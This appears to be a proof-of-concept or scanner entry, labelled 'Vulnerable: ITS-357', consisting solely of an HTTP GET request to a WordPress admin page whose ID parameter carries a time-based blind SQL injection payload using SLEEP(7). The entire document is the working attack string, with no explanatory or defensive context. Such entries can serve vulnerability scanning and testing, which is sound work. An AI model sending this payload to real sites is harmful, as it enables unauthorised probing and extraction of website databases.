# Vulnerable: ITS-357
GET /wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home
